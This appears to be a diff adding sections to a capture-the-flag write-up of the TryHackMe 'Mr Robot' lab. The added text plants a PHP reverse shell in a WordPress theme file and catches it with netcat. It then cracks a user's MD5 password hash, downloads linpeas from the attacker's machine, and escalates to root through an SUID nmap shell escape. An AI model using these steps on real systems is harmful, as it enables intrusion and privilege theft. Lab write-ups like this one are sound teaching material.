@@ -205,8 +205,193 @@ $ wpscan --url http://10.10.151.145/wp-login.php -U Elliot -P fsocity.dic
 ```
 It took 20-30 mins to show the password, but its the same password as the base64 string so lets just move on :)
 
+## Exploiting WordPress
 
+We now need to get a reverse shell. We went onto Appreance > 404.php and replace the existing code with a php resverse shell code from pentestmonkey. 
 
+https://github.com/pentestmonkey/php-reverse-shell
+
+![10 apperance](https://github.com/Nath28m/CTF-writeups-tryhackme/assets/115990830/c5f3695b-f751-454e-901d-dbe7eb9866ea)
+
+Changing the IP (the listener) and the Port number.
+```shell
+set_time_limit (0);
+$VERSION = "1.0";
+$ip = '127.0.0.1';  // CHANGE THIS
+$port = 1234;       // CHANGE THIS
+$chunk_size = 1400;
+$write_a = null;
+$error_a = null;
+$shell = 'uname -a; w; id; /bin/sh -i';
+$daemon = 0;
+$debug = 0;
+```
+Setup a netcat listener to our machine.
+
+```shell
+$ nc -lvnp 4444
+```
+
+Once completed, we execute the 404.php code in our browser 
+```shell
+http://<target-IP>/wp-content/themes/twentyfifteen/404.php
+```
+BOOM! We got a shell :)
+
+```shell
+$ nc -lvnp 4444 
+listening on [any] 4444 ...
+connect to [10.8.122.251] from (UNKNOWN) [10.10.151.145] 32879
+Linux linux 3.13.0-55-generic #94-Ubuntu SMP Thu Jun 18 00:27:10 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux
+ 15:27:12 up  1:02,  0 users,  load average: 1.95, 1.66, 0.96
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=1(daemon) gid=1(daemon) groups=1(daemon)
+/bin/sh: 0: can't access tty; job control turned off
+$
+```
+We now need to stablise our shell, we import the following command
+
+```shell
+$ python -c 'import pty; pty.spawn("/bin/bash")'
+daemon@linux:/$ whoami
+whoami
+daemon
+daemon@linux:/$ 
+```
+In the Home directory we found the second flag and a password in the robot directory. 
+Turns out the flag needs permission to read the file????
+
+```shell
+daemon@linux:/$ cd home
+cd home
+daemon@linux:/home$ ls
+ls
+robot
+daemon@linux:/home$ cd robot
+cd robot
+daemon@linux:/home/robot$ ls
+ls
+key-2-of-3.txt  password.raw-md5
+daemon@linux:/home/robot$ cat key-2-of-3.txt
+cat key-2-of-3.txt
+cat: key-2-of-3.txt: Permission denied
+daemon@linux:/home/robot$ cat password.raw-md5
+cat password.raw-md5
+robot:c3fcd3d76192e4007dfb496cca67e13b
+daemon@linux:/home/robot$
+```
+Turns out that password belongs to an user called robot
+
+```shell
+daemon@linux:/home/robot$ ls -la
+ls -la
+total 16
+drwxr-xr-x 2 root  root  4096 Nov 13  2015  .
+drwxr-xr-x 3 root  root  4096 Nov 13  2015  ..
+-r-------- 1 robot robot   33 Nov 13  2015  key-2-of-3.txt
+-rw-r--r-- 1 robot robot   39 Nov 13  2015  password.raw-md5
+```
+We used a tool called crackstation for cracking hash codes. 
+
+![11 crackstation](https://github.com/Nath28m/CTF-writeups-tryhackme/assets/115990830/401acfe9-d215-4ccb-95ea-4f1dd769d1f0)
+
+This might be the password for robot?????
+
+It Is the password lol (nice password).
+Lets view the second flag.
+```shell
+su robot
+Password: abcdefghijklmnopqrstuvwxyz
+robot@linux:~$ whoami
+whoami
+robot
+robot@linux:~$ cat key-2-of-3.txt
+```
+## Escalate Privileges 
+There are numerous ways to findout what you can escalate your privileges. We used Linpeas.
+
+We create a python HTTP server 
+
+We have to make sure that we change directory to the 'tmp' folder otherwise we cannot import linpeas to the machine as we dont have permissions.
+
+```shell
+python -m http.server 80 (our machine)
+```
+curl command 
+
+```shell
+$ wget 10.8.122.251:8000/linpeas.sh
+wget 10.8.122.251:8000/linpeas.sh
+--2023-08-02 15:50:03--  http://10.8.122.251:8000/linpeas.sh
+Connecting to 10.8.122.251:8000... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 134168 (131K) [text/x-sh]
+Saving to: ‘linpeas.sh’
+
+100%[======================================>] 134,168      538KB/s   in 0.2s   
+
+2023-08-02 15:50:03 (538 KB/s) - ‘linpeas.sh’ saved [134168/134168]
+
+robot@linux:/tmp$ ls
+ls
+linpeas.sh
+```
+Run linpeas and let the magic happen 
+
+```shell
+$ sh linpeas.sh
+```
+After the scan has complete there are some interesting information about the machine
+
+![13 kernal exploit](https://github.com/Nath28m/CTF-writeups-tryhackme/assets/115990830/49f79280-2d86-4b9a-b343-71d9d22c42f9)
+
+The machine version is outdated so We could perform a Kernal exploit???
+
+But we're concerned about the random nmap file in the SUID??????
+
+![12 linpeas](https://github.com/Nath28m/CTF-writeups-tryhackme/assets/115990830/8046d9c0-082c-4a1b-b90e-a7fe4cd26a07)
+
+This is interesting because if the SUID bit is enabled on a file, this means that non-root users can exploit this and escalate root access!!!
+
+We now read more about this nmap file. behold gtfobins.
+
+https://gtfobins.github.io/
+
+We know the system nmap is running on version 3.x we can perform the following commands.
+
+![15 nmap](https://github.com/Nath28m/CTF-writeups-tryhackme/assets/115990830/1886d687-380d-40aa-8b6a-129e5b6a52ff)
+
+Lets give it a try!!!!
+
+```shell
+$ nmap --interactive
+nmap --interactive
+
+Starting nmap V. 3.81 ( http://www.insecure.org/nmap/ )
+Welcome to Interactive Mode -- press h <enter> for help
+nmap> !sh
+!sh
+#
+```
+Did it work?
+
+```shell
+# whoami
+whoami
+root
+```
+It did we are now root!!!!!! Let get that final flag 
+
+```shell
+# cd root
+cd root
+# ls
+ls
+firstboot_done  key-3-of-3.txt
+# cat key-3-of-3.txt
+cat key-3-of-3.txt
+```
+EZ!!!
 
 
 
